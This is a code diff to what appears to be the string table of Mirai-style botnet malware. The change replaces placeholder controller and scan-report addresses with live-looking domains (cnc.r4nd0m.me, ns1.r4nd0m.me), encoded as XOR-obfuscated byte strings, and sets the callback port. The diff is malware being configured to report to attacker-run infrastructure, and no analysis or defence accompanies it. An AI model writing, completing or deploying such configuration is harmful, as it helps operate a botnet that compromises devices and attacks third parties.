@@ -15,11 +15,11 @@ struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
-    add_entry(TABLE_CNC_IP, "\x13\x10\x15\x0C\x12\x0C\x12\x0C\x13", 9); // 127.0.0.1
+    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x50\x16\x4C\x46\x12\x4F\x0C\x4F\x47\x22", 14); // cnc.r4nd0m.me
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
 
-    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
-    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC4", 2);         // 48102
+    add_entry(TABLE_SCAN_CB_DOMAIN, "\x4C\x51\x13\x0C\x50\x16\x4C\x46\x12\x4F\x0C\x4F\x47\x22", 14); // ns1.r4nd0m.me
+    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
 
     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
 
@@ -115,7 +115,6 @@ char *table_retrieve_val(int id, int *len)
         printf("[table] Tried to access table.%d but it is locked\n", id);
         return NULL;
     }
-//    printf("[table] Retrieved value: %s\n", val->val);
 #endif
 
     if (len != NULL)
